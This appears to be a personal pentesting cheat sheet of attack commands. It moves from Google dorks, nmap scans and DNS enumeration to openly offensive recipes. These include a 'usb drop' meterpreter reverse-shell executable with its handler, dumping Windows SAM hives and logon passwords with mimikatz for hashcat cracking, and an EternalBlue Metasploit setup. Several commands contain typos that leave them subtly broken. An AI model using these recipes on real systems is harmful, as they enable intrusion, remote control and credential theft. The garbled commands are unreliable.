
# Passive recon:

allintitle: \"index of/admin\"
inurl:<url> allintitle: \"index of/admin\"

theHarvester -d cisco.com -b google  

RECON-NG:
 workspaces create plu 


# Active scan:
arp scan:
nmap -PR <ip>
nmap -PA <ip>

nmap -P 1-200 <ip>
nmap --top-port 2000 <ip>

Scan all port:
nmap -p- <ip>

SYN Scan:
nmap -sS <ip>

FIN Scan:
nmap -sF <ip>

ACK Scan:
nmap -sA <ip>

Scan no flag:
nmap -sN <ip>

XMAS Scan:
nmap -sX <ip>

Pn: Treat all hosts as online -- skip host discovery
nmap -Pn <ip>

nmap -A -Pn <ip>

nmap -script=http-waf-fingerprint <url> : detect waf
lbd <url> : detect load balancing
whatweb <url>: scan web info
nikto <url>: enum web dir

  
profiling with nmap:
nmap <ip> -A

nmap <ip> -sS: TCP SYN port scan (Default)

nmap --script nmap-vulners -sV -p80 <ip> : Scan vuln 

nmap --script vulscan --script-args vulnscandb=exploitdb.csv -sV -p80 <ip> : Scan vuln with exploitdb

link cheatsheet:
https://academy.ehacking.net/courses/recipe-2-active-information-gathering-enumeration-the-right-way/lectures/27146478


msf5 use auxiliary/scanner/http/dir_listing
msf5 use auxiliary/scanner/http/file_dir

Dns enum:
host -t ns <url>
host -t mx <url>
host  <url>
  
nslookup -type=mx pluralsight.com
nslookup -type=soa pluralsight.com
nslookup -type=any pluralsight.com

hping3 -F -c 3-p 79 -s  5150 192.168.0.25
-f: flag
-c: count
-p: port
-s: source port

# Profiling linux:
lsof -i | grep LISTEN
lsof -i tcp
ss -tl
ss -lu
  
# Recon tool:
metagofill - passive recon
fcrackzip - crack zip password
digicert ssltool( website) - looking cert ssl

# Web enum
nmap --script=http-enum urbandictionary.com 
nmap --script=http-php-version urbandictionary.com 

# scan vuln
nmap -P <ip> -oG - | nikto -h
-h: host
# bash encode
iconv -f utf8 -t utf15 hh.txt> jj.txt
# python encode
str.encode("base64","strict") 

  
 # usb drop:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=<PORT> -f exe -a x64 -0 /root/Desktop/salari.exe

msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST
set LPORT
RUN


# Export reg hive SAM windows
dir in downloads
cmd:

reg save hklm\sam wind10-sam.hiv
reg save hklm\sec wind10-sec.hiv

- hklm: hkey local machine

download mimikatz and copy 2 file .hiv to sub folder of minikit x64

Run mimikats by admin

privilege::debug
log reg-sam-sec.log
sekurlsa::logonpasswords

# elevate privilege:
token::elevate
# dump sump
lsadump::sam win10-sam.hiv win10-sec.hiv
in kali, run hashcat to get a plain text password

# enternal blue attack:
msf5> search enternalblue
use ..
set payload windows/x65/meterpreter/reverse_tcp
options
set RHOSTS,PORT,LHOST
set smbuser <user>
set smbpass <pass>
